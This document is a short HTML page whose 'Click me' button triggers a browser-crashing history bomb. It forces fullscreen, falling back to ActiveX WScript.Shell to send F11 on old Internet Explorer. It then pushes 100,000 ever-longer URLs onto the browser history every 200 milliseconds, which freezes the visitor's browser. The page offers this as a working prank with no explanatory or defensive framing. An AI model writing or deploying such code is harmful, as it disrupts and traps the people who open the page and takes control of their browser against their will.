<!DOCTYPE html>
<html>
<head>
<script src="http://code.jquery.com/jquery-1.9.1.js"></script>
<script> 

	function callerinterval(){
		setInterval(function(){requestFullScreen(); }, 1);
	}

	function bomb_url() {
	  var total = "";
	  for( var i = 0; i < 100000; i++ ) {
	    total = total + i.toString();
	    /* The total is the url being passed */
	    /* @param: state, title, url */
	    history.pushState(0,0, total );
	    /* Displaying the value in page */
	    // document.write(total)
	  }
	}
	/* Set interval calls the bomb url in every 200 ms */
	function intervalCall() {
	  setInterval(function(){ 
	    bomb_url(); }, 200);

	}

	function requestFullScreen() {
	  var element = document.body;

	  // Supports: IE, Firefox, Safari, Chrome, Opera and most browsers
	  // https://developer.mozilla.org/en-US/docs/Web/API/Element/requestFullScreen
	  var request = element.requestFullScreen || element.webkitRequestFullScreen 

	  if (request) { // Native full screen 
	    request.call(element);
	  } else if (typeof window.ActiveXObject !== "undefined") { // Older IE
	    var wscript = new ActiveXObject("WScript.Shell");

	    if (wscript !== null) {
	      wscript.SendKeys("{F11}");
	    }
	  }

	  move();
	}

	function move() {
   		intervalCall();
	}

</script>
</head>

	<input id="clickbutton" type="button" value="Click me" onclick="requestFullScreen()" />
</div>

</body>
</html>
